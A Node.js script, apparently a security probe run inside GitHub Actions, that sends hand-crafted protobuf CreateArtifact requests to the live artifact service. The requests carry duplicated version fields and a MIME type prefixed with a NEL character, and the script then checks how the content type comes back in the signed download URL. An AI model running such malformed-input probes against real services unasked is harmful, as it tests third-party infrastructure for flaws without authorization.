// Safe duplicate protobuf version probe; upload as duplicate-version-root.mjs.
// Requires @actions/artifact and @azure/storage-blob at repository root.
// Logs no tokens, URLs, or response bodies.
import {createHash} from 'node:crypto';
import {BlobClient} from '@azure/storage-blob';
import {internalArtifactTwirpClient} from './node_modules/@actions/artifact/lib/internal/shared/artifact-twirp-client.js';
import {getBackendIdsFromToken} from './node_modules/@actions/artifact/lib/internal/shared/util.js';
import {getResultsServiceUrl, getRuntimeToken} from './node_modules/@actions/artifact/lib/internal/shared/config.js';
import {CreateArtifactRequest, CreateArtifactResponse, StringValue} from './node_modules/@actions/artifact/lib/generated/index.js';

const ids = getBackendIdsFromToken();
const client = internalArtifactTwirpClient({maxAttempts: 1});
const endpoint = new URL('/twirp/github.actions.results.api.v1.ArtifactService/CreateArtifact', getResultsServiceUrl());
const body = Buffer.from('{"probe":"duplicate-version"}');
const hash = StringValue.create({value: `sha256:${createHash('sha256').update(body).digest('hex')}`});
const odd = '\u0085application/json';
const wrapper = Buffer.from(StringValue.toBinary(StringValue.create({value: odd})));
const codes = value => Array.from(value || '', c => c.codePointAt(0));

for (const versions of [[6, 7], [7, 6]]) {
  const label = versions.join('-then-');
  const name = `benign-dup-version-${process.env.GITHUB_RUN_ID}-${label}`;
  const base = Buffer.from(CreateArtifactRequest.toBinary(
    CreateArtifactRequest.create({...ids, name})));
  const request = Buffer.concat([base,
    Buffer.from([0x28, versions[0], 0x28, versions[1], 0x32, wrapper.length]), wrapper]);
  const row = {label, validUtf8Nel: request.includes(Buffer.from([0xc2, 0x85]))};
  try {
    const response = await fetch(endpoint, {method: 'POST', body: request,
      headers: {'content-type': 'application/protobuf',
        authorization: `Bearer ${getRuntimeToken()}`},
      signal: AbortSignal.timeout(15000)});
    const bytes = Buffer.from(await response.arrayBuffer());
    row.createStatus = response.status;
    if (response.status !== 200) {
      let error = {};
      try { error = JSON.parse(bytes.toString('utf8')); } catch {}
      row.errorCode = String(error.code || '');
      row.errorMessage = String(error.msg || '').replace(/https?:\/\/\S+/g, '<url>').slice(0, 140);
      console.log('DUP-VERSION', JSON.stringify(row));
      continue;
    }
    const created = CreateArtifactResponse.fromBinary(bytes);
    await new BlobClient(created.signedUploadUrl).getBlockBlobClient().uploadData(body,
      {blobHTTPHeaders: {blobContentType: 'application/json'}});
    row.upload = true;
    const finalized = await client.FinalizeArtifact({...ids, name,
      size: String(body.length), hash});
    row.finalize = Boolean(finalized.ok);
    const signed = (await client.GetSignedArtifactURL({...ids, name})).signedUrl;
    row.rsctCodes = codes(new URL(signed).searchParams.get('rsct') || '');
  } catch {
    row.stageError = 'request-upload-finalize-sign';
  }
  console.log('DUP-VERSION', JSON.stringify(row));
}
